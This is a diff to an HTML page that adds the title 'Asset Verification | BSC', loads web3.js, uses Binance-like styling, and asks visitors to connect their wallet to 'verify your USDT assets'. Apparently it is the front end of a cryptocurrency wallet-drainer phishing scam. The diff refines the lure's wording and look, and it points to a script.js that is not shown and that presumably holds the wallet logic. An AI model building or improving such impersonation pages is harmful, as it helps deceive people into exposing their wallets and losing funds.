@@ -3,23 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Verification</title>
+    <title>Asset Verification | BSC</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .card { background: #1e2329; padding: 30px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 90%; max-width: 350px; }
-        h2 { color: #f0b90b; }
-        p { color: #929aa5; font-size: 14px; }
-        .btn { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .btn:disabled { background: #474d57; opacity: 0.6; }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 360px; }
+        h2 { color: #f0b90b; margin-bottom: 15px; font-size: 24px; }
+        p { color: #929aa5; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s ease; }
+        .btn:hover { background: #d9a508; transform: translateY(-2px); }
+        .btn:disabled { background: #474d57; cursor: not-allowed; transform: none; }
+        #status { margin-top: 15px; font-size: 12px; color: #f0b90b; }
     </style>
 </head>
 <body>
+
     <div class="card">
         <h2>Verify Assets</h2>
-        <p>Connect your wallet to proceed with automated verification.</p>
+        <p>Please connect your wallet to verify your USDT assets on the Binance Smart Chain network.</p>
         <button id="nextBtn" class="btn">Connect Wallet</button>
+        <div id="status"></div>
     </div>
+
     <script src="script.js"></script>
 </body>
 </html>
